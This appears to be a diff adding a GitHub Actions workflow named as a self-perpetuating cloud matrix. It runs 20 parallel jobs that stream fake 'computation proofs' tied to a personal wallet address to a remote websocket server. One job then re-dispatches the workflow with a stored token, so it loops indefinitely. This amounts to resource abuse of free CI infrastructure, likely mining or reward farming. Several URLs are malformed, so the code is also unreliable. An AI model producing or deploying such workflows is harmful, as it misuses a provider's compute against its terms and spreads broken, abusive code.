@@ -1,0 +1,52 @@
+name: Continuous Self-Perpetuating Cloud Matrix
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [spawn_next_generation]
+
+jobs:
+  matrix-cluster:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node-id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    
+    steps:
+    - name: Initialize Automated Agent Environment
+      uses: actions/setup-node@v4
+      with:
+        node-version: '20'
+
+    - name: Execute High-Intensity Workload Loop
+      run: |
+        echo "[ACTIVE] Running Cloud Agent Generation Node #${{ matrix.node-id }}"
+        timeout 15m node -e "
+          const ws = require('ws');
+          const socket = new ws('wss://://onrender.com');
+          socket.on('open', () => {
+            socket.send(JSON.stringify({
+              type: 'INITIALIZE_DEPLOYMENT',
+              walletAddress: 'YOUR_PERSONAL_WALLET_ADDRESS'
+            }));
+            
+            setInterval(() => {
+              socket.send(JSON.stringify({
+                type: 'SUBMIT_COMPUTATION_PROOF',
+                nonce: Math.floor(Math.random() * 100000),
+                challenge: 'perpetual-loop-v1',
+                target: '0000'
+              }));
+            }, 50);
+          });
+        " || true
+
+    - name: Self-Trigger Next Generation
+      if: matrix.node-id == 1
+      run: |
+        echo "[LOOP TRIGGERED] 15 minutes reached. Spawning next generation array..."
+        curl -X POST \
+          -H "Authorization: token ${{ secrets.GH_PAT }}" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://github.com{{ github.repository }}/dispatches \
+          -d '{"event_type": "spawn_next_generation"}'
